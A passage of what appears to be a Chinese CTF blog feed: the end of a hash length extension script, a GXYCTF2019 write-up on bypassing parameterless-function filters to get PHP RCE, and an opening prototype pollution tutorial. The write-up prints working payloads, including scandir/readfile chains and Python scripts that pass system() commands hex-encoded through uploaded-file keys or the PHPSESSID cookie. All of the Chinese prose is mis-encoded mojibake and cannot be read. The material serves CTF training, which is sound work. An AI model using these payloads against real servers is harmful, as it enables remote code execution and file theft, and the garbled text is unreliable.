<span class="hljs-attribute">sys</span>.exit()<span class="hljs-attribute">hash_origin</span> = sys.argv[<span class="hljs-number">1</span>]<span class="hljs-attribute">str_append</span> = sys.argv[<span class="hljs-number">2</span>]<span class="hljs-attribute">lenth</span> = int(sys.argv[<span class="hljs-number">3</span>])<span class="hljs-attribute">m</span> = md<span class="hljs-number">5</span>py.md<span class="hljs-number">5</span>()<span class="hljs-attribute">str_payload</span> = payload(lenth, str_append)<span class="hljs-attribute">print</span> <span class="hljs-string">&quot;Payload: &quot;</span>, repr(str_payload)<span class="hljs-attribute">print</span> <span class="hljs-string">&quot;Payload urlencode:&quot;</span>, urllib.quote_plus(str_payload)<span class="hljs-attribute">print</span> <span class="hljs-string">&quot;md5:&quot;</span>, m.extension_attack(hash_origin, str_append, lenth)</code></pre><h4 id="ä¿®å¤"><a class="header-anchor" href="#ä¿®å¤">ğŸ­</a>ä¿®å¤</h4><blockquote><p>å¾ˆå¤šå“ˆå¸Œç®—æ³•éƒ½å­˜åœ¨Length Extensionæ”»å‡»ï¼Œè¿™æ˜¯å› ä¸ºè¿™äº›å“ˆå¸Œç®—æ³•éƒ½ä½¿ç”¨äº†Merkleâ€“DamgÃ¥rd constructionè¿›è¡Œæ•°æ®çš„å‹ç¼©ï¼Œæµè¡Œç®—æ³•æ¯”å¦‚MD5ã€SHA-1ç­‰éƒ½å—å½±å“ã€‚å¯å°†<code>md5($salt.$role)</code>æ›¿æ¢æˆ<code>md5($role.$salt)</code></p></blockquote><p>ä»¥ä¸Šä¸ºhashdumpåŸç†ï¼Œæœ¬é¢˜å¯è§£ï¼š</p><p><img src="/2021/05/05/hash/3.png" alt="3"></p><p>å‚æ•°ä¼ é€’å¾—åˆ°flagï¼š</p><p><img src="/2021/05/05/hash/6.png" alt="6"></p><p>å‚è€ƒï¼š<a href="https://joychou.org/web/hash-length-extension-attack.html#directory079462120078608992">Hash Length Extension Attack</a></p><p><a href="https://blog.csdn.net/qq_42967398/article/details/103549258">BUUCTF WEB [De1CTF 2019]SSRF Me</a></p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>GXYCTF2019|ç¦æ­¢å¥—å¨ƒ</title>
    <link href="/2021/05/03/GXYctf/"/>
    <url>/2021/05/03/GXYctf/</url>
    
    <content type="html"><![CDATA[<p>è¿™é¢˜æåˆ°äº†æ— å‚RCEï¼Œåšä¸ªæ€»ç»“ã€‚</p><blockquote><p>gitæ³„éœ²æºç ï¼Œåˆ©ç”¨githackæ‰«å‡ºæºç :</p><blockquote><pre><code class="hljs php">&gt;&gt;<span class="hljs-meta">&lt;?php</span>&gt;&gt;<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;flag.php&quot;</span>;&gt;&gt;<span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;flagåœ¨å“ªé‡Œå‘¢ï¼Ÿ&lt;br&gt;&quot;</span>;&gt;&gt;<span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>($_GET[<span class="hljs-string">&#x27;exp&#x27;</span>]))&#123;   <span class="hljs-keyword">if</span> (!preg_match(<span class="hljs-string">&#x27;/data:\/\/|filter:\/\/|php:\/\/|phar:\/\//i&#x27;</span>, $_GET[<span class="hljs-string">&#x27;exp&#x27;</span>])) &#123;       <span class="hljs-keyword">if</span>(<span class="hljs-string">&#x27;;&#x27;</span> === preg_replace(<span class="hljs-string">&#x27;/[a-z,_]+\((?R)?\)/&#x27;</span>, <span class="hljs-literal">NULL</span>, $_GET[<span class="hljs-string">&#x27;exp&#x27;</span>])) &#123;           <span class="hljs-keyword">if</span> (!preg_match(<span class="hljs-string">&#x27;/et|na|info|dec|bin|hex|oct|pi|log/i&#x27;</span>, $_GET[<span class="hljs-string">&#x27;exp&#x27;</span>])) &#123;               <span class="hljs-comment">// echo $_GET[&#x27;exp&#x27;];</span>               @<span class="hljs-keyword">eval</span>($_GET[<span class="hljs-string">&#x27;exp&#x27;</span>]);           &#125;           <span class="hljs-keyword">else</span>&#123;               <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;è¿˜å·®ä¸€ç‚¹å“¦ï¼&quot;</span>);           &#125;       &#125;       <span class="hljs-keyword">else</span>&#123;           <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;å†å¥½å¥½æƒ³æƒ³ï¼&quot;</span>);       &#125;   &#125;   <span class="hljs-keyword">else</span>&#123;       <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;è¿˜æƒ³è¯»flagï¼Œè‡­å¼Ÿå¼Ÿï¼&quot;</span>);   &#125;&gt;&gt;&#125;&gt;&gt;<span class="hljs-comment">// highlight_file(__FILE__);</span>&gt;&gt;<span class="hljs-meta">?&gt;</span></code></pre></blockquote></blockquote><h4 id="åˆ†æ"><a class="header-anchor" href="#åˆ†æ">ğŸ­</a>åˆ†æ</h4><ul><li>éœ€è¦ä»¥GETå½¢å¼ä¼ å…¥ä¸€ä¸ªåä¸ºexpçš„å‚æ•°ã€‚å¦‚æœæ»¡è¶³æ¡ä»¶ä¼šæ‰§è¡Œè¿™ä¸ªexpå‚æ•°çš„å†…å®¹ã€‚</li><li>è¿‡æ»¤äº†å¸¸ç”¨çš„å‡ ä¸ªä¼ªåè®®ï¼Œä¸èƒ½ä»¥ä¼ªåè®®è¯»å–æ–‡ä»¶ã€‚</li><li>(?R)å¼•ç”¨å½“å‰è¡¨è¾¾å¼ï¼Œåé¢åŠ äº†?é€’å½’è°ƒç”¨ã€‚åªèƒ½åŒ¹é…é€šè¿‡æ— å‚æ•°çš„å‡½æ•°ã€‚</li><li>æ­£åˆ™åŒ¹é…æ‰äº†et/na/infoç­‰å…³é”®å­—ã€‚</li><li><code>eval($_GET['exp']); </code>æ— å‚æ•°RCE</li></ul><p>flagåœ¨flag.php,è¦è¯»å–å®ƒé¦–å…ˆéœ€è¦å¾—åˆ°å½“å‰ç›®å½•ä¸‹çš„æ–‡ä»¶<br>scandir()å‡½æ•°å¯ä»¥æ‰«æå½“å‰ç›®å½•ä¸‹çš„æ–‡ä»¶ï¼š</p><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>print_r(scandir(<span class="hljs-string">&#x27;.&#x27;</span>));<span class="hljs-meta">?&gt;</span></code></pre><p>æˆ‘ä»¬éœ€è¦æ„é€ <code>scandir('.')</code>.</p><p>è¿™é‡Œéœ€è¦ç”¨åˆ°</p><blockquote><p><code>localeconv()</code> å‡½æ•°</p><blockquote><p>è¿”å›ä¸€åŒ…å«æœ¬åœ°æ•°å­—åŠè´§å¸æ ¼å¼ä¿¡æ¯çš„æ•°ç»„.</p><p>æ•°ç»„ç¬¬ä¸€é¡¹å°±æ˜¯.current() è¿”å›æ•°ç»„ä¸­çš„å½“å‰å•å…ƒ, é»˜è®¤å–ç¬¬ä¸€ä¸ªå€¼ã€‚<br>pos() æ˜¯current() çš„åˆ«å</p></blockquote></blockquote><p>ç¬¬ä¸€ä¸ªifå°±è§£å†³äº†</p><pre><code class="hljs lisp">print_r(<span class="hljs-name">scandir</span>(<span class="hljs-name">current</span>(<span class="hljs-name">localeconv</span>())))<span class="hljs-comment">;</span>print_r(<span class="hljs-name">scandir</span>(<span class="hljs-name">pos</span>(<span class="hljs-name">localeconv</span>())))<span class="hljs-comment">;</span></code></pre><p>æµ‹è¯•ä¸€ä¸‹ï¼š</p><p><img src="/2021/05/03/GXYctf/1.jpg" alt="1"></p><p>æ¥ä¸‹æ¥è¦æ€è€ƒæ€ä¹ˆè¯»å–å€’æ•°ç¬¬äºŒä¸ªæ•°ç»„</p><h4 id="current"><a class="header-anchor" href="#current">ğŸ­</a>current</h4><p><img src="/2021/05/03/GXYctf/2.png" alt="2"></p><p>ä¸èƒ½ç›´æ¥è¯»å–flagçš„å…ƒç´ ï¼Œåªèƒ½è¿ç”¨å…¶å®ƒå…ƒç´ ã€‚</p><h4 id="array-reverse"><a class="header-anchor" href="#array-reverse">ğŸ­</a><strong>array_reverse()</strong></h4><p>ä»¥ç›¸åçš„å…ƒç´ é¡ºåºè¿”å›æ•°ç»„</p><pre><code class="hljs reasonml">?exp=print<span class="hljs-constructor">_r(<span class="hljs-params">array_reverse</span>(<span class="hljs-params">scandir</span>(<span class="hljs-params">current</span>(<span class="hljs-params">localeconv</span>()</span>))));</code></pre><h4 id="array-flip"><a class="header-anchor" href="#array-flip">ğŸ­</a>array_flip()</h4><p>äº¤æ¢æ•°ç»„çš„é”®å’Œå€¼</p><pre><code class="hljs reasonml">?exp=print<span class="hljs-constructor">_r(<span class="hljs-params">array_flip</span>(<span class="hljs-params">scandir</span>(<span class="hljs-params">current</span>(<span class="hljs-params">localeconv</span>()</span>))));</code></pre><p>array_rand()ä»æ•°ç»„ä¸­éšæœºå–å‡ºä¸€ä¸ªæˆ–å¤šä¸ªå•å…ƒï¼Œä¸æ–­åˆ·æ–°è®¿é—®å°±ä¼šä¸æ–­éšæœºè¿”å›ï¼Œæœ¬é¢˜ç›®ä¸­scandir()è¿”å›çš„æ•°ç»„åªæœ‰5ä¸ªå…ƒç´ ï¼Œåˆ·æ–°å‡ æ¬¡å°±èƒ½åˆ·å‡ºæ¥flag.php</p><pre><code class="hljs reasonml">?exp=print<span class="hljs-constructor">_r(<span class="hljs-params">array_rand</span>(<span class="hljs-params">array_flip</span>(<span class="hljs-params">scandir</span>(<span class="hljs-params">current</span>(<span class="hljs-params">localeconv</span>()</span>)))));</code></pre><h4 id="session-id-session-start"><a class="header-anchor" href="#session-id-session-start">ğŸ­</a><strong>session_id(session_start())</strong></h4><p>æœ¬é¢˜ç›®è™½ç„¶banäº†hexå…³é”®å­—ï¼Œå¯¼è‡´hex2bin()è¢«ç¦ç”¨ï¼Œä½†æ˜¯æˆ‘ä»¬å¯ä»¥å¹¶ä¸ä¾èµ–äºåå…­è¿›åˆ¶è½¬ASCIIçš„æ–¹å¼ï¼Œå› ä¸ºflag.phpè¿™äº›å­—ç¬¦æ˜¯PHPSESSIDæœ¬èº«å°±æ”¯æŒçš„ã€‚<br>ä½¿ç”¨sessionä¹‹å‰éœ€è¦é€šè¿‡session_start()å‘Šè¯‰PHPä½¿ç”¨sessionï¼Œphpé»˜è®¤æ˜¯ä¸ä¸»åŠ¨ä½¿ç”¨sessionçš„ã€‚<br>session_id()å¯ä»¥è·å–åˆ°å½“å‰çš„session idã€‚æ•…æ‰‹åŠ¨è®¾ç½®åä¸ºPHPSESSIDçš„cookieï¼Œå¹¶è®¾ç½®å€¼ä¸ºflag.php</p><h4 id="tipsï¼š"><a class="header-anchor" href="#tipsï¼š">ğŸ­</a>tipsï¼š</h4><p>å¦‚ä½•è¯»flag.phpçš„æºç </p><p>å› ä¸ºetè¢«banäº†ï¼Œæ‰€ä»¥ä¸èƒ½ä½¿ç”¨file_get_contents()ï¼Œä½†æ˜¯å¯ä»¥å¯ä»¥ä½¿ç”¨readfile()æˆ–highlight_file()ä»¥åŠå…¶åˆ«åå‡½æ•°show_source()</p><blockquote><p><code>view-source:http://172.21.4.12:10031/?exp=print_r(readfile(next(array_reverse(scandir(pos(localeconv()))))));</code><br><code>?exp=highlight_file(next(array_reverse(scandir(pos(localeconv())))));</code><br><code>?exp=show_source(session_id(session_start()));</code></p></blockquote><p>å¾—åˆ°flag</p><h2 id="æ— å‚RCE"><a class="header-anchor" href="#æ— å‚RCE">ğŸ­</a>æ— å‚RCE</h2><blockquote><blockquote><p>æ¯”è¾ƒå¸¸è§getshellæ˜¯<code>eval($_GET['code']);</code><br>ä½†å®ƒä¸€èˆ¬æœ‰å¦‚ä¸‹é™åˆ¶</p><pre><code class="hljs autoit"><span class="hljs-keyword">if</span>(<span class="hljs-string">&#x27;;&#x27;</span> === preg_replace(<span class="hljs-string">&#x27;/[^\W]+\((?R)?\)/&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>, $_GET[<span class="hljs-string">&#x27;code&#x27;</span>])) &#123;     <span class="hljs-built_in">eval</span>($_GET[<span class="hljs-string">&#x27;code&#x27;</span>])<span class="hljs-comment">;</span>&#125;</code></pre><p>æ­¤æ—¶æˆ‘ä»¬ä½¿ç”¨å‚æ•°åˆ™æ— æ³•é€šè¿‡æ­£åˆ™çš„æ ¡éªŒï¼Œè¯¥æ­£åˆ™æ˜¯æˆ‘ä»¬è¯´çš„æ— å‚æ•°å‡½æ•°çš„æ ¡éªŒï¼Œå…¶åªå…è®¸æ‰§è¡Œå¦‚ä¸‹æ ¼å¼å‡½æ•°</p><pre><code class="hljs lisp">a(<span class="hljs-name">b</span>(<span class="hljs-name">c</span>()))<span class="hljs-comment">;</span>a()<span class="hljs-comment">;</span></code></pre><p>ä½†ä¸å…è®¸</p><pre><code class="hljs isbl"><span class="hljs-function"><span class="hljs-title">a</span>(<span class="hljs-string">&#x27;123&#x27;</span>);</span></code></pre></blockquote></blockquote><p>æ­¤ç±»é¢˜è§£æ³•ï¼š</p><ul><li>åˆ©ç”¨è¶…å…¨å±€å˜é‡è¿›è¡Œbypassï¼Œè¿›è¡ŒRCE</li><li>è¿›è¡Œä»»æ„æ–‡ä»¶è¯»å–</li></ul><h3 id="bypass"><a class="header-anchor" href="#bypass">ğŸ­</a>bypass</h3><h4 id="getenv"><a class="header-anchor" href="#getenv">ğŸ­</a>getenv()</h4><p>è¶…å…¨å±€å˜é‡ï¼š</p><pre><code class="hljs gams"><span class="hljs-meta"><span class="hljs-meta-keyword">$GLOBALS</span></span><span class="hljs-symbol">$</span>_SERVER<span class="hljs-symbol">$</span>_GET<span class="hljs-symbol">$</span>_POST<span class="hljs-symbol">$</span>_FILES<span class="hljs-symbol">$</span>_COOKIE<span class="hljs-symbol">$</span>_SESSION<span class="hljs-symbol">$</span>_REQUEST<span class="hljs-symbol">$</span>_ENV</code></pre><p><code>$_ENV</code>å¯¹åº”å‡½æ•°ä¸º<code>getenv()</code></p><p><img src="/2021/05/03/GXYctf/3.png" alt="3"></p><p>ä½†å¦‚ä½•å–å‡ºæˆ‘ä»¬æŒ‡å®šçš„å€¼</p><p><img src="/2021/05/03/GXYctf/4.png" alt="4"></p><p>ä½†æ˜¯æˆ‘ä»¬æƒ³è¦æ•°ç»„çš„å€¼ï¼Œåˆ™å¯ä»¥ä½¿ç”¨ï¼š</p><p><img src="/2021/05/03/GXYctf/5.png" alt="5"></p><p>æˆ‘ä»¬å¯ç”¨çˆ†ç ´çš„æ–¹å¼è·å–æ•°ç»„ä¸­ä»»æ„ä½ç½®éœ€è¦çš„å€¼ï¼Œå³å¯ä½¿ç”¨getenv()è·å–æŒ‡å®šä½ç½®çš„æ¶æ„å‚æ•°</p><h4 id="getallheaders"><a class="header-anchor" href="#getallheaders">ğŸ­</a>getallheaders()</h4><p>ä¸Šè¿°æ–¹æ³•è·å–çš„æ˜¯æ‰€æœ‰ç¯å¢ƒå˜é‡çš„åˆ—è¡¨ï¼Œæˆ‘ä»¬å¹¶ä¸éœ€è¦è¿™ä¹ˆå¤šä¿¡æ¯ã€‚ä»…ä»…http headerå³å¯<br>åœ¨apache2ç¯å¢ƒä¸‹ï¼Œgetallheaders()å¯è¿”å›ï¼š</p><pre><code class="hljs lsl">array(<span class="hljs-number">8</span>) &#123;     [<span class="hljs-string">&quot;Host&quot;</span>]=&gt; <span class="hljs-type">string</span>(<span class="hljs-number">14</span>) <span class="hljs-string">&quot;106.14.114.127&quot;</span>     [<span class="hljs-string">&quot;Connection&quot;</span>]=&gt; <span class="hljs-type">string</span>(<span class="hljs-number">10</span>) <span class="hljs-string">&quot;keep-alive&quot;</span>     [<span class="hljs-string">&quot;Cache-Control&quot;</span>]=&gt; <span class="hljs-type">string</span>(<span class="hljs-number">9</span>) <span class="hljs-string">&quot;max-age=0&quot;</span>     [<span class="hljs-string">&quot;Upgrade-Insecure-Requests&quot;</span>]=&gt; <span class="hljs-type">string</span>(<span class="hljs-number">1</span>) <span class="hljs-string">&quot;1&quot;</span>     [<span class="hljs-string">&quot;User-Agent&quot;</span>]=&gt; <span class="hljs-type">string</span>(<span class="hljs-number">120</span>) <span class="hljs-string">&quot;Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.86 Safari/537.36&quot;</span>     [<span class="hljs-string">&quot;Accept&quot;</span>]=&gt; <span class="hljs-type">string</span>(<span class="hljs-number">118</span>) <span class="hljs-string">&quot;text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3&quot;</span>     [<span class="hljs-string">&quot;Accept-Encoding&quot;</span>]=&gt; <span class="hljs-type">string</span>(<span class="hljs-number">13</span>) <span class="hljs-string">&quot;gzip, deflate&quot;</span> [<span class="hljs-string">&quot;Accept-Language&quot;</span>]=&gt; <span class="hljs-type">string</span>(<span class="hljs-number">14</span>) <span class="hljs-string">&quot;zh-CN,zh;q=0.9&quot;</span> &#125;</code></pre><p>æˆ‘ä»¬å¯ä»¥åœ¨headerä¸­åšä¸€äº›è‡ªå®šä¹‰ï¼š</p><p><img src="/2021/05/03/GXYctf/6.png" alt="6"></p><p>å°†ç»“æœä¸­çš„æ¶æ„å‘½ä»¤å–å‡º</p><pre><code class="hljs lisp">var_dump(<span class="hljs-name">end</span>(<span class="hljs-name">getallheaders</span>()))<span class="hljs-comment">;</span></code></pre><p><img src="/2021/05/03/GXYctf/7.png" alt="7"></p><p>http headerä¸­çš„skyå˜æˆäº†æˆ‘ä»¬çš„å‚æ•°ï¼Œå¯ç”¨å…¶è¿›è¡Œbypass æ— å‚æ•°å‡½æ•°æ‰§è¡Œ</p><p><img src="/2021/05/03/GXYctf/8.png" alt="8"></p><h4 id="get-defined-vars"><a class="header-anchor" href="#get-defined-vars">ğŸ­</a>get_defined_vars()</h4><p>ä½¿ç”¨getallheaders()å…¶å®å…·æœ‰å±€é™æ€§ï¼Œå› ä¸ºä»–æ˜¯apacheçš„å‡½æ•°ï¼Œå¦‚æœç›®æ ‡ä¸­é—´ä»¶ä¸ä¸ºapacheï¼Œé‚£ä¹ˆè¿™ç§æ–¹æ³•å°±ä¼šå¤±æ•ˆã€‚æˆ‘ä»¬å¯ä»¥ä½¿ç”¨get_defined_vars()ï¼Œé¦–å…ˆçœ‹ä¸€ä¸‹å®ƒçš„å›æ˜¾</p><p><img src="/2021/05/03/GXYctf/9.png" alt="9"></p><p>å¯å›æ˜¾å…¨å±€å˜é‡ï¼š<code>$_GET$_POST$_FILES$_COOKIE</code>ï¼Œæ•…å¯åˆ©ç”¨GETè¿›è¡ŒRCE</p><p><img src="/2021/05/03/GXYctf/10.png" alt="10"></p><p>ä½†ä¸€èˆ¬ç½‘ç«™å–œæ¬¢å¯¹<code>$_GET$_POST$_COOKIE</code>è¿›è¡Œè¿‡æ»¤ï¼Œæˆ‘ä»¬å¯ä»¥å°è¯•ä»<code>$_FILES</code>ä¸‹æ‰‹ï¼Œè¿™å°±éœ€è¦æˆ‘ä»¬è‡ªå·±å†™ä¸€ä¸ªä¸Šä¼ ï¼š</p><pre><code class="hljs routeros">import requests<span class="hljs-keyword">from</span> io import BytesIOpayload = <span class="hljs-string">&quot;system(&#x27;ls /tmp&#x27;);&quot;</span>.encode(<span class="hljs-string">&#x27;hex&#x27;</span>)files = &#123;  payload: BytesIO(<span class="hljs-string">&#x27;sky cool!&#x27;</span>)&#125;r = requests.post(<span class="hljs-string">&#x27;http://localhost/skyskysky.php?code=eval(hex2bin(array_rand(end(get_defined_vars()))));&#x27;</span>, <span class="hljs-attribute">files</span>=files, <span class="hljs-attribute">allow_redirects</span>=<span class="hljs-literal">False</span>)<span class="hljs-builtin-name">print</span> r.content</code></pre><p>è‹¥ä¸ç”¨hexç¼–ç è¿›è¡ŒRCEï¼Œç©ºæ ¼ä¼šè¢«æ›¿æ¢æˆ<code>_</code></p><h4 id="session-id"><a class="header-anchor" href="#session-id">ğŸ­</a>session_id()</h4><p><img src="/2021/05/03/GXYctf/11.png" alt="11"></p><p>PHPSESSIDå…è®¸å­—æ¯å’Œæ•°å­—å‡ºç°ï¼Œé‚£ä¹ˆæˆ‘ä»¬å°±æœ‰äº†æ–°çš„æ€è·¯ï¼Œå³<code>hex2bin</code><br>è„šæœ¬å¦‚ä¸‹</p><pre><code class="hljs routeros">import requestsurl = <span class="hljs-string">&#x27;http://localhost/?code=eval(hex2bin(session_id(session_start())));&#x27;</span>payload = <span class="hljs-string">&quot;echo &#x27;sky cool&#x27;;&quot;</span>.encode(<span class="hljs-string">&#x27;hex&#x27;</span>)cookies = &#123;<span class="hljs-string">&#x27;PHPSESSID&#x27;</span>:payload&#125;r = requests.<span class="hljs-builtin-name">get</span>(<span class="hljs-attribute">url</span>=url,cookies=cookies)<span class="hljs-builtin-name">print</span> r.content</code></pre><p>å³å¯è¾¾æˆRCEå’Œbypassçš„ç›®çš„</p><h4 id="dirname-chdir"><a class="header-anchor" href="#dirname-chdir">ğŸ­</a>dirname() &amp; chdir()</h4><p>ç›®å½•éå†è¯»æ–‡ä»¶ï¼Œæˆ‘ä»¬å¯ä»¥åˆ©ç”¨<code>getcwd()</code>è·å–å½“å‰ç›®å½•</p><pre><code class="hljs reasonml">?code=var<span class="hljs-constructor">_dump(<span class="hljs-params">getcwd</span>()</span>);<span class="hljs-built_in">string</span>(<span class="hljs-number">13</span>) <span class="hljs-string">&quot;/var/www/html&quot;</span></code></pre><p>ç”¨<code>scandir()</code>è¿›è¡Œå½“å‰ç›®å½•éå†</p><pre><code class="hljs lsl">?code=var_dump(scandir(getcwd()));array(<span class="hljs-number">3</span>) &#123; [<span class="hljs-number">0</span>]=&gt; <span class="hljs-type">string</span>(<span class="hljs-number">1</span>) <span class="hljs-string">&quot;.&quot;</span> [<span class="hljs-number">1</span>]=&gt; <span class="hljs-type">string</span>(<span class="hljs-number">2</span>) <span class="hljs-string">&quot;..&quot;</span> [<span class="hljs-number">2</span>]=&gt; <span class="hljs-type">string</span>(<span class="hljs-number">9</span>) <span class="hljs-string">&quot;index.php&quot;</span> &#125;</code></pre><p>ç”¨<code>dirname()</code>è¿›è¡Œç›®å½•ä¸Šè·³</p><pre><code class="hljs lsl">?code=var_dump(scandir(dirname(getcwd())));array(<span class="hljs-number">4</span>) &#123; [<span class="hljs-number">0</span>]=&gt; <span class="hljs-type">string</span>(<span class="hljs-number">1</span>) <span class="hljs-string">&quot;.&quot;</span> [<span class="hljs-number">1</span>]=&gt; <span class="hljs-type">string</span>(<span class="hljs-number">2</span>) <span class="hljs-string">&quot;..&quot;</span> [<span class="hljs-number">2</span>]=&gt; <span class="hljs-type">string</span>(<span class="hljs-number">14</span>) <span class="hljs-string">&quot;flag_phpbyp4ss&quot;</span> [<span class="hljs-number">3</span>]=&gt; <span class="hljs-type">string</span>(<span class="hljs-number">4</span>) <span class="hljs-string">&quot;html&quot;</span> &#125;</code></pre><p>æ›´æ”¹å½“å‰ç›®å½•</p><pre><code class="hljs gauss"><span class="hljs-built_in">chdir</span> ( <span class="hljs-keyword">string</span> $directory ) : <span class="hljs-keyword">bool</span></code></pre><p>å°† PHP çš„å½“å‰ç›®å½•æ”¹ä¸º directoryã€‚<br>æ‰€ä»¥æˆ‘ä»¬è¿™é‡Œåœ¨</p><pre><code class="hljs isbl"><span class="hljs-function"><span class="hljs-title">dirname</span>(<span class="hljs-title">getcwd</span>())</span></code></pre><p>è¿›è¡Œè®¾ç½®å³å¯</p><pre><code class="hljs lisp">chdir(<span class="hljs-name">dirname</span>(<span class="hljs-name">getcwd</span>()))</code></pre><p>è¯»å–<code>/var/www/123</code>:</p><pre><code class="hljs awk">http:<span class="hljs-regexp">//</span>localhost/?code=readfile(<span class="hljs-keyword">next</span>(array_reverse(scandir(dirname(chdir(dirname(getcwd())))))));</code></pre><p>å³å¯è¿›è¡Œæ–‡ä»¶è¯»å–ã€‚</p><p>å‚è€ƒï¼š<a href="https://skysec.top/2019/03/29/PHP-Parametric-Function-RCE/#">PHP Parametric Function RCE</a></p><p><a href="https://www.cnblogs.com/wangtanzhi/p/12260986.html">[GXYCTF2019]ç¦æ­¢å¥—å¨ƒ</a></p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>jsåŸå‹é“¾æ±¡æŸ“</title>
    <link href="/2021/04/18/js/"/>
    <url>/2021/04/18/js/</url>
    
    <content type="html"><![CDATA[<h2 id="javascript-å›é¡¾"><a class="header-anchor" href="#javascript-å›é¡¾">ğŸ­</a>javascript å›é¡¾</h2><blockquote><p>åœ¨javascriptä¸­ï¼Œç»§æ‰¿çš„æ•´ä¸ªè¿‡ç¨‹å°±ç§°ä¸ºè¯¥ç±»çš„åŸå‹é“¾ã€‚</p></blockquote><blockquote><p>æ¯ä¸ªå¯¹è±¡çš„éƒ½æœ‰ä¸€ä¸ªæŒ‡å‘ä»–çš„åŸå‹(prototype)çš„å†…éƒ¨é“¾æ¥ï¼Œè¿™ä¸ªåŸå‹å¯¹è±¡åˆæœ‰å®ƒè‡ªå·±çš„åŸå‹ï¼Œä¸€ç›´åˆ°nullä¸ºæ­¢ã€‚</p></blockquote><blockquote><p><strong>åœ¨javascriptä¸­ä¸€åˆ‡çš†å¯¹è±¡</strong>ï¼Œå› ä¸ºæ‰€æœ‰çš„å˜é‡ï¼Œå‡½æ•°ï¼Œæ•°ç»„ï¼Œå¯¹è±¡ éƒ½å§‹äºobjectçš„åŸå‹å³object.prototypeï¼Œä½†åªæœ‰ç±»æœ‰å¯¹è±¡ï¼Œå¯¹è±¡æ²¡æœ‰ï¼Œå¯¹è±¡æœ‰çš„æ˜¯<code>__proto__</code>ï¼Œå’Œç±»çš„prototypeå¯¹åº”ï¼Œä¸”äºŒè€…ç­‰ä»·ã€‚</p></blockquote><blockquote><p>ç±»æ˜¯é€šè¿‡å‡½æ•°æ¥å®šä¹‰çš„,å®šä¹‰çš„è¿™ä¸ªå‡½æ•°åˆæ˜¯è¿™ä¸ªç±»çš„<code>constructor</code>å±æ€§å€¼,</p></blockquote><blockquote><p>å­ç±»æ˜¯å¯ä»¥é€šè¿‡prototypeé“¾ä¿®æ”¹å…¶çˆ¶ç±»ä»¥åŠç¥–çˆ¶ç±»çš„å±æ€§å€¼ã€‚</p></blockquote><h4 id="ç»§æ‰¿æœºåˆ¶ï¼šprototypeåŸå‹é“¾"><a class="header-anchor" href="#ç»§æ‰¿æœºåˆ¶ï¼šprototypeåŸå‹é“¾">ğŸ­</a>ç»§æ‰¿æœºåˆ¶ï¼šprototypeåŸå‹é“¾</h4><p>æ—¥æœŸï¼š</p><pre><code class="hljs xl"><span class="hljs-function"><span class="hljs-title">f</span> -&gt;</span> D<span class="hljs-function"><span class="hljs-title">ata</span>.prototype -&gt;</span> <span class="hljs-function"><span class="hljs-title">object</span>.prototype-&gt;</span>null</code></pre><p>å‡½æ•°ï¼š</p><pre><code class="hljs xl"><span class="hljs-function"><span class="hljs-title">d</span> -&gt;</span> <span class="hljs-function"><span class="hljs-title">function</span>.prototype -&gt;</span> <span class="hljs-function"><span class="hljs-title">object</span>.prototype-&gt;</span>null</code></pre><p>æ•°ç»„ï¼š</p><pre><code class="hljs xl"><span class="hljs-function"><span class="hljs-title">c</span> -&gt;</span> <span class="hljs-function"><span class="hljs-title">array</span>.prototype -&gt;</span> <span class="hljs-function"><span class="hljs-title">object</span>.prototype-&gt;</span>null</code></pre><p>ç±»ï¼š</p><pre><code class="hljs xl"><span class="hljs-function"><span class="hljs-title">b</span> -&gt;</span> <span class="hljs-function"><span class="hljs-title">a</span>.prototype -&gt;</span> <span class="hljs-function"><span class="hljs-title">object</span>.prototype-&gt;</span>null</code></pre><p>å½“è¦ä½¿ç”¨æˆ–è¾“å‡ºä¸€ä¸ªå˜é‡æ—¶ï¼šé¦–å…ˆä¼šåœ¨æœ¬å±‚ä¸­æœç´¢ç›¸åº”çš„å˜é‡ï¼Œå¦‚æœä¸å­˜åœ¨çš„è¯ï¼Œå°±ä¼šå‘ä¸Šæœç´¢ï¼Œå³åœ¨è‡ªå·±çš„çˆ¶ç±»ä¸­æœç´¢ï¼Œå½“çˆ¶ç±»ä¸­ä¹Ÿæ²¡æœ‰æ—¶ï¼Œå°±ä¼šå‘ç¥–çˆ¶ç±»æœç´¢ï¼Œç›´åˆ°æŒ‡å‘nullï¼Œå¦‚æœæ­¤æ—¶è¿˜æ²¡æœ‰æœç´¢åˆ°ï¼Œå°±ä¼šè¿”å› undefinedã€‚</p><pre><code class="hljs javascript"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">i</span>(<span class="hljs-params"></span>)</span>&#123;    <span class="hljs-built_in">this</span>.a = <span class="hljs-string">&quot;test1&quot;</span>;    <span class="hljs-built_in">this</span>.b = <span class="hljs-string">&quot;test2&quot;</span>;&#125;</code></pre><p><img src="/2021/04/18/js/1.png" alt="1"></p><p>å…¶çˆ¶ç±»ä¸ºobjectï¼Œä¸”é‡Œé¢è¿˜æœ‰è®¸å¤šå‡½æ•°ã€‚</p><h2 id="åŸå‹é“¾æ±¡æŸ“"><a class="header-anchor" href="#åŸå‹é“¾æ±¡æŸ“">ğŸ­</a>åŸå‹é“¾æ±¡æŸ“</h2><p>demoï¼š</p><pre><code class="hljs awk"><span class="hljs-regexp">//</span> fooæ˜¯ä¸€ä¸ªç®€å•çš„JavaScriptå¯¹è±¡let foo = &#123;bar: <span class="hljs-number">1</span>&#125;<span class="hljs-regexp">//</span> foo.bar æ­¤æ—¶ä¸º<span class="hljs-number">1</span>console.log(foo.bar)<span class="hljs-regexp">//</span> ä¿®æ”¹fooçš„åŸå‹ï¼ˆå³Objectï¼‰foo.__proto__.bar = <span class="hljs-number">2</span><span class="hljs-regexp">//</span> ç”±äºæŸ¥æ‰¾é¡ºåºçš„åŸå› ï¼Œfoo.barä»ç„¶æ˜¯<span 